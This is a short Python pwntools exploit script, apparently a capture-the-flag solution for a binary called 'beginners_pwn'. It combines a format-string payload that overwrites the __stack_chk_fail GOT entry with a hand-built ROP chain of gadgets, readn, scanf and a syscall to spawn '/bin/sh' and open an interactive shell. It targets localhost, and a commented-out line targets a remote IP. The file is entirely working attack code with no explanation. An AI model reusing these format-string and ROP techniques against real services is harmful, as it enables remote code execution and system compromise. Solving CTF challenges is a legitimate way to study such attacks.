from pwn import *

#context.log_level = "debug"
elf = ELF("beginners_pwn")
context.binary = elf

s = connect("localhost", 1025)
#s = connect("35.221.81.216", 30002)

t1 = "%1$s %8$lx\0     "+pack(elf.got.__stack_chk_fail)
s.send(t1)

t2 = " ".join(["%1$d"]*59) + "\0/bin/sh"

s.sendline(
  "\0"*(0x18-len(t1)+0x11) +

  pack(0x4012c3) + # pop rdi;
  pack(0x404028) + # buf
  pack(0x4012c1) + # pop rsi; pop r15;
  pack(len(t2)) +
  pack(0) +
  pack(elf.symbols.readn) +

  pack(0x4012c3) + # pop rdi;
  pack(0x404028) + # buf
  pack(0x4012c1) + # pop rsi; pop r15;
  pack(0x404028+len(t2)) +
  pack(0) +
  pack(elf.plt.__isoc99_scanf) +

  pack(0x4012c3) + # pop rdi;
  pack(0x404028+len(t2)-7) + # /bin/sh
  pack(0x4012c1) + # pop rsi; pop r15;
  pack(0) +
  pack(0) +
  pack(0x40118f) + # syscall
  " 401256")

input()

s.send(t2)
s.sendline(" ".join(["0"]*59))

s.interactive()